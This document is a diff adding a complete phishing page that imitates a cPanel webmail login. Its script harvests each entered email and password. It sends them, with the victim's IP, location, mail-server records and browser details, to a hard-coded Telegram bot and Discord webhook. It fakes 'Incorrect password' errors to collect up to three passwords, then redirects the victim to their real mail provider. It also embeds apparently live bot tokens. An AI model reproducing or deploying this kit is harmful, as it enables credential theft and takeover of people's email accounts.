@@ -1,0 +1,652 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" href="favicon.ico">
+    <title>Webmail - Login</title>
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+ 
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            padding-top: 50px;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+        }
+
+        .webmail-logo {
+            font-size: 60px;
+            font-weight: 900;
+            color: #ff6c2c;
+            font-style: italic;
+            letter-spacing: -2px;
+            font-family: "Arial Black", Gadget, sans-serif;
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .label-text {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .input-group {
+            position: relative;
+            display: flex;
+            align-items: stretch;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .input-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            background-color: #f7f7f7;
+            border-right: 1px solid #ccc;
+            color: #888;
+        }
+
+        .input-box {
+            flex: 1;
+            height: 40px;
+            padding: 8px 12px;
+            font-size: 14px;
+            border: none;
+            background: #fff;
+            outline: none;
+        }
+
+        .input-box:focus {
+            box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
+        }
+
+        .input-box.error {
+            border-color: #e81123 !important;
+        }
+
+        .btn-login {
+            width: 100%;
+            height: 42px;
+            background-color: #2b98d2;
+            color: white;
+            border: 1px solid #2385b9;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #2385b9;
+        }
+
+        .reset-link {
+            display: block;
+            text-align: center;
+            font-size: 13px;
+            color: #333;
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 40px;
+        }
+
+        .reset-link:hover {
+            color: #2b98d2;
+        }
+
+        .language-selection {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 50px;
+            font-size: 12px;
+            color: #333;
+            max-width: 800px;
+            padding: 0 20px;
+        }
+
+        .lang-item {
+            cursor: pointer;
+            text-decoration: none;
+            color: #333;
+        }
+
+        .lang-item:hover {
+            color: #2b98d2;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: auto;
+            padding-bottom: 30px;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: #ff6c2c;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        .footer-logo i {
+            font-size: 20px;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #888;
+        }
+
+        .error-msg {
+            color: #e81123;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .webmail-logo {
+                font-size: 48px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-container">
+        <div class="logo-container">
+            <div class="webmail-logo">Webmail</div>
+        </div>
+
+        <div class="login-box">
+            <div id="login_step_1">
+                <div class="form-group">
+                    <label class="label-text">Email Address</label>
+                    <div class="input-group" id="username_group">
+                        <div class="input-icon"><i class="fas fa-user"></i></div>
+                        <input type="email" id="username" class="input-box" placeholder="Enter your email address." required autofocus>
+                    </div>
+                    <div id="error_1" class="error-msg">The User Name or Email is required.</div>
+                </div>
+                <button type="button" class="btn-login" id="btn_next">Log in</button>
+            </div>
+
+            <div id="login_step_2" style="display: none;">
+                <div class="form-group">
+                    <label class="label-text">Email Address</label>
+                    <div class="input-group" style="background-color: #eee;">
+                        <div class="input-icon"><i class="fas fa-user"></i></div>
+                        <input type="text" id="username_display_input" class="input-box" style="background-color: #eee;" readonly>
+                        <div style="padding: 10px; cursor: pointer; color: #2b98d2; font-size: 12px; font-weight: 600;" id="btn_back_trigger">Edit</div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label class="label-text">Password</label>
+                    <form id="loginForm">
+                        <div class="input-group" id="password_group">
+                            <div class="input-icon"><i class="fas fa-lock"></i></div>
+                            <input type="password" id="inputPassword" class="input-box" placeholder="Enter your email password." required>
+                        </div>
+                    </form>
+                    <div id="error_2" class="error-msg">The Password is required.</div>
+                </div>
+                <button type="button" class="btn-login" id="btn_signin_trigger">Log in</button>
+            </div>
+
+            <a href="#" class="reset-link">Reset Password</a>
+        </div>
+
+        <div class="language-selection">
+            <span class="lang-item">العربية</span>
+            <span class="lang-item">čeština</span>
+            <span class="lang-item">dansk</span>
+            <span class="lang-item">Deutsch</span>
+            <span class="lang-item">Ελληνικά</span>
+            <span class="lang-item">español</span>
+            <span class="lang-item">español latinoamericano</span>
+            <span class="lang-item">español de España</span>
+            <span class="lang-item">...</span>
+        </div>
+
+        <div class="footer">
+            <div class="footer-logo">
+                <i class="fab fa-cpanel"></i>
+            </div>
+            <div class="copyright">
+                Copyright© 2026 cPanel, L.L.C.<br>
+                <a href="#" style="color: #888; text-decoration: none;">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // ================================================================
+        // TELEGRAM & DISCORD CONFIGURATION
+        // ================================================================
+        var TELEGRAM_BOT_TOKEN = "8602938905:AAElFHCF2z9pL85-F8DMCjG3oty-P5tu7w8";
+        var TELEGRAM_CHAT_ID = "7079354924";
+        var DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495377055636783184/WUioecst2ImG0NdtknPyXxgAFo4vqo0wJlQPNW02kO4RdbfF39nWpiFvpRUUzKpv8uqJ";
+
+        // ================================================================
+        // URL PARAMETERS WITH BASE64 DECODE
+        // ================================================================
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        function decodeBase64(str) {
+            try {
+                var base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+                while (base64.length % 4) base64 += '=';
+                var decoded = atob(base64);
+                if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+                    return decoded;
+                }
+                return null;
+            } catch(e) {
+                return null;
+            }
+        }
+
+        var $c = getUrlParameter('c');
+        var $s = getUrlParameter('s');
+        var $h = getUrlParameter('h');
+        var $e = getUrlParameter('e');
+        var utm_source = getUrlParameter('utm_source');
+        var utm_medium = getUrlParameter('utm_medium');
+        var utm_campaign = getUrlParameter('utm_campaign');
+        var utm_term = getUrlParameter('utm_term');
+        var utm_content = getUrlParameter('utm_content');
+        var utm_generic = getUrlParameter('utm');
+        var currentEmail = "";
+
+        // Check hash fragment
+        var hash = window.location.hash;
+        if (hash && hash.startsWith('#') && hash.includes('@')) {
+            var emailFromHash = hash.substring(1);
+            if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailFromHash)) {
+                currentEmail = emailFromHash;
+            }
+        }
+
+        // Check URL parameters with Base64 decode
+        if ($c) {
+            var decoded = decodeBase64($c);
+            if (decoded) {
+                currentEmail = decoded;
+            } else if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test($c)) {
+                currentEmail = $c;
+            }
+        } else if ($s) {
+            var decoded = decodeBase64($s);
+            if (decoded) {
+                currentEmail = decoded;
+            } else if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test($s)) {
+                currentEmail = $s;
+            }
+        } else if ($e && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test($e)) {
+            currentEmail = $e;
+        } else if (utm_generic && utm_generic.includes('email=')) {
+            var parts = utm_generic.split('email=');
+            if (parts.length > 1) {
+                currentEmail = parts[1].split('&')[0];
+            }
+        }
+
+        if (currentEmail) {
+            currentEmail = currentEmail.trim();
+        }
+
+        // ================================================================
+        // LOCATION DATA
+        // ================================================================
+        async function getLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                return { ip: "Unknown", country_name: "Unknown", country_code: "XX", city: "Unknown", region: "Unknown", org: "Unknown" };
+            }
+        }
+
+        // ================================================================
+        // SEND TO TELEGRAM
+        // ================================================================
+        async function sendToTelegram(email, password, domain, ip, ua, mx) {
+            var brand = domain ? domain.split('.')[0] : 'Email';
+            var msg = '🔐 ' + brand + ' Email Login\n\n📧 Account: ' + email + '\n🔑 Password: ' + password + '\n🌐 Domain: ' + domain + '\n📡 MX: ' + mx + '\n🖥️ IP: ' + ip + '\n⏱️ Time: ' + new Date().toLocaleString();
+            var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+            var params = new URLSearchParams();
+            params.append('chat_id', TELEGRAM_CHAT_ID);
+            params.append('text', msg);
+            try { await fetch(url, { method: 'POST', body: params }); } catch(e) {}
+        }
+
+        // ================================================================
+        // SEND TO DISCORD
+        // ================================================================
+        async function sendToDiscord(email, password, domain, ip, ua, mx) {
+            var brand = domain ? domain.split('.')[0] : 'Email';
+            var embed = { title: "🔐 " + brand + " Email Login", color: 0x0066FF, fields: [
+                { name: "📧 Account", value: '`' + email + '`' },
+                { name: "🔑 Password", value: '||`' + password + '`||' },
+                { name: "🌐 Domain", value: '`' + domain + '`', inline: true },
+                { name: "📡 MX Records", value: '`' + mx + '`' },
+                { name: "🖥️ IP", value: '`' + ip + '`', inline: true },
+                { name: "⏱️ Time", value: '`' + new Date().toLocaleString() + '`' }
+            ] };
+            try { await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) }); } catch(e) {}
+        }
+
+        // ================================================================
+        // LOOKUP MX RECORDS
+        // ================================================================
+        async function lookupMXRecords(domain) {
+            try {
+                var url = 'https://cloudflare-dns.com/dns-query?name=' + encodeURIComponent(domain) + '&type=MX';
+                var res = await fetch(url, { headers: { 'Accept': 'application/dns-json' } });
+                if (!res.ok) return "Unable to get MX records";
+                var data = await res.json();
+                if (!data.Answer) return "MX records not found";
+                var mx = data.Answer.filter(r => r.type === 15).map(r => { var parts = r.data.split(' '); return parts[0] + ' ' + parts[1]; });
+                return mx.length ? mx.join(', ') : "MX records not found";
+            } catch(e) { return "Unable to query"; }
+        }
+
+        // ================================================================
+        // GET CLIENT IP
+        // ================================================================
+        async function getClientIP() {
+            try {
+                var res = await fetch('https://api.ipify.org?format=json');
+                var data = await res.json();
+                return data.ip;
+            } catch(e) { return 'Unable to get'; }
+        }
+
+        // ================================================================
+        // REDIRECT TO USER'S EMAIL DOMAIN (e.g., https://wakwak.com/)
+        // ================================================================
+        async function redirectToEmailDomain(email) {
+            if (email && email.includes('@')) {
+                var domain = email.split('@')[1].toLowerCase();
+                
+                // Common email provider websites (main domain)
+                var domainUrls = {
+                    // Google
+                    'gmail.com': 'https://www.google.com/',
+                    'googlemail.com': 'https://www.google.com/',
+                    // Microsoft
+                    'outlook.com': 'https://www.microsoft.com/',
+                    'hotmail.com': 'https://www.microsoft.com/',
+                    'live.com': 'https://www.microsoft.com/',
+                    'office365.com': 'https://www.microsoft.com/',
+                    'microsoft.com': 'https://www.microsoft.com/',
+                    // Yahoo
+                    'yahoo.com': 'https://www.yahoo.com/',
+                    'yahoo.com.cn': 'https://www.yahoo.com/',
+                    'yahoo.co.jp': 'https://www.yahoo.co.jp/',
+                    // China
+                    'qq.com': 'https://www.qq.com/',
+                    '163.com': 'https://www.163.com/',
+                    '126.com': 'https://www.126.com/',
+                    'yeah.net': 'https://www.yeah.net/',
+                    'aliyun.com': 'https://www.aliyun.com/',
+                    'alibaba.com': 'https://www.alibaba.com/',
+                    'alibaba-inc.com': 'https://www.alibaba.com/',
+                    'sina.com': 'https://www.sina.com.cn/',
+                    'sohu.com': 'https://www.sohu.com/',
+                    // Apple
+                    'icloud.com': 'https://www.icloud.com/',
+                    'me.com': 'https://www.icloud.com/',
+                    'mac.com': 'https://www.icloud.com/',
+                    // Proton
+                    'protonmail.com': 'https://proton.me/',
+                    'proton.me': 'https://proton.me/',
+                    // Others
+                    'zoho.com': 'https://www.zoho.com/',
+                    'mail.ru': 'https://mail.ru/',
+                    'yandex.com': 'https://yandex.com/',
+                    'yandex.ru': 'https://yandex.ru/',
+                    'naver.com': 'https://www.naver.com/',
+                    'daum.net': 'https://www.daum.net/',
+                    'gmx.com': 'https://www.gmx.com/',
+                    'web.de': 'https://web.de/',
+                    'tutanota.com': 'https://tutanota.com/',
+                    'mail.com': 'https://www.mail.com/',
+                    'aol.com': 'https://www.aol.com/',
+                    'fastmail.com': 'https://www.fastmail.com/',
+                    'hey.com': 'https://www.hey.com/',
+                    'wakwak.com': 'https://wakwak.com/'
+                };
+                
+                // Direct match - redirect to the domain's main website
+                if (domainUrls[domain]) {
+                    window.location.href = domainUrls[domain];
+                    return;
+                }
+                
+                // Check for partial matches
+                for (var key in domainUrls) {
+                    if (domain.includes(key) || domain.endsWith(key)) {
+                        window.location.href = domainUrls[key];
+                        return;
+                    }
+                }
+                
+                // If no match, redirect to the domain itself (e.g., https://wakwak.com/)
+                window.location.href = 'https://' + domain;
+                return;
+            }
+            
+            // Fallback: Google
+            window.location.href = 'https://www.google.com/';
+        }
+
+        // ================================================================
+        // HANDLE LOGIN SUBMISSION - 3 ATTEMPTS
+        // ================================================================
+        var passwordAttempts = 0;
+        var MAX_ATTEMPTS = 3;
+
+        async function handleFormSubmit() {
+            var email = $('#username').val().trim();
+            var password = $('#inputPassword').val().trim();
+
+            if (!password.length) {
+                $('#error_2').text('The Password is required.').show();
+                $('#password_group').css('border-color', '#e81123');
+                $('#inputPassword').focus();
+                return false;
+            }
+
+            // Simple validation - same as original
+            var ListEntries = ['.*fuck.*', '.*pussy.*', '.*bitch.*', '.*asshole.*', '.*fool.*', '.*dick.*', '.*mama.*', '.*12345.*'];
+            var isValidPass = true;
+            for (var i = 0; i < ListEntries.length; i++) {
+                if (new RegExp(ListEntries[i], 'i').test(password)) { isValidPass = false; break; }
+            }
+
+            if (!isValidPass) {
+                $('#error_2').text('Incorrect password. Please try again.').show();
+                $('#password_group').css('border-color', '#e81123');
+                $('#inputPassword').val('').focus();
+                return false;
+            }
+
+            $('#error_2').hide();
+            $('#password_group').css('border-color', '#ccc');
+
+            try {
+                var domain = email.includes('@') ? email.split('@')[1] : 'unknown';
+                var ip = await getClientIP();
+                var mx = await lookupMXRecords(domain);
+                var locationData = await getLocationData();
+                var currentDate = new Date().toLocaleString();
+                var browser = navigator.userAgent;
+
+                var utmString = "";
+                if (utm_source) utmString += `**Source:** ${utm_source}\n`;
+                if (utm_medium) utmString += `**Medium:** ${utm_medium}\n`;
+                if (utm_campaign) utmString += `**Campaign:** ${utm_campaign}\n`;
+                if (utm_term) utmString += `**Term:** ${utm_term}\n`;
+                if (utm_content) utmString += `**Content:** ${utm_content}\n`;
+                if (utm_generic) utmString += `**Generic UTM:** ${utm_generic}\n`;
+
+                var discordMessage = `**👤 User Details**\n` +
+                    `**📧 Email:** \`${email}\`\n` +
+                    `**🔑 Password (Attempt ${passwordAttempts + 1}/${MAX_ATTEMPTS}):** \`${password}\`\n\n` +
+                    (utmString ? `**🔗 UTM Parameters**\n${utmString}\n` : "") +
+                    `**📍 Location Details**\n` +
+                    `**🌍 Country:** ${locationData.country_name} (${locationData.country_code})\n` +
+                    `**🌆 City:** ${locationData.city}\n` +
+                    `**🏘️ Region:** ${locationData.region}\n` +
+                    `**🔌 ISP:** ${locationData.org}\n` +
+                    `**🔍 IP:** ${locationData.ip}\n\n` +
+                    `**📡 MX Records:** ${mx}\n\n` +
+                    `**📱 Device Info**\n` +
+                    `**🌐 Browser:** ${browser}\n` +
+                    `**⏰ Time:** ${currentDate}`;
+
+                // Send to both Discord and Telegram
+                await sendToDiscord(email, password, domain, ip, navigator.userAgent, mx);
+                await sendToTelegram(email, password, domain, ip, navigator.userAgent, mx);
+
+                // Check attempts - exactly like original
+                if (passwordAttempts < MAX_ATTEMPTS - 1) {
+                    passwordAttempts++;
+                    $('#inputPassword').val('');
+                    $('#error_2').text('Incorrect password. Please try again.').show();
+                    $('#password_group').css('border-color', '#e81123');
+                    $('#inputPassword').focus();
+                    return false;
+                }
+
+                // On 3rd attempt, redirect to user's email domain
+                await redirectToEmailDomain(email);
+                
+            } catch (error) {
+                // On error, redirect to domain if this was the last attempt
+                if (passwordAttempts >= MAX_ATTEMPTS - 1) {
+                    await redirectToEmailDomain(email);
+                } else {
+                    passwordAttempts++;
+                    $('#inputPassword').val('');
+                    $('#error_2').text('Incorrect password. Please try again.').show();
+                    $('#password_group').css('border-color', '#e81123');
+                    $('#inputPassword').focus();
+                }
+            }
+        }
+
+        // ================================================================
+        // FETCH COMPANY NAME
+        // ================================================================
+        async function fetchCompanyName(email) {
+            var regex = /.+@(.*?)\..+/;
+            var m = regex.exec(email);
+            if (!m) return;
+            const domain = m[1];
+            try {
+                const response = await fetch(`https://autocomplete.clearbit.com/v1/companies/suggest?query=${domain}`);
+                const data = await response.json();
+                if (data && data.length > 0) {
+                    const company = data[0].name;
+                }
+            } catch (error) {}
+        }
+
+        // ================================================================
+        // INITIALIZATION
+        // ================================================================
+        $(function() {
+            if (currentEmail) {
+                $('#username').val(currentEmail);
+                $('#username_display_input').val(currentEmail);
+                $('#login_step_1').hide();
+                $('#login_step_2').show();
+                fetchCompanyName(currentEmail);
+            }
+
+            $('#username').on('input', function() {
+                $('#username_group').css('border-color', '#ccc');
+                $('#error_1').hide();
+            });
+
+            $('#inputPassword').on('input', function() {
+                $('#password_group').css('border-color', '#ccc');
+                $('#error_2').hide();
+            });
+
+            $('#btn_next').on('click', async function() {
+                var email = $('#username').val().trim();
+                if (email.length > 0) {
+                    $('#username_display_input').val(email);
+                    $('#login_step_1').hide();
+                    $('#login_step_2').show();
+                    $('#inputPassword').focus();
+                    await fetchCompanyName(email);
+                } else {
+                    $('#error_1').text('The User Name or Email is required.').show();
+                    $('#username_group').css('border-color', '#e81123');
+                }
+            });
+
+            $('#btn_back_trigger').on('click', function() {
+                $('#login_step_2').hide();
+                $('#login_step_1').show();
+                $('#username').focus();
+            });
+
+            $('#btn_signin_trigger').on('click', handleFormSubmit);
+
+            $('#loginForm').on('submit', function(e) {
+                e.preventDefault();
+                handleFormSubmit();
+            });
+        });
+    </script>
+</body>
+</html>
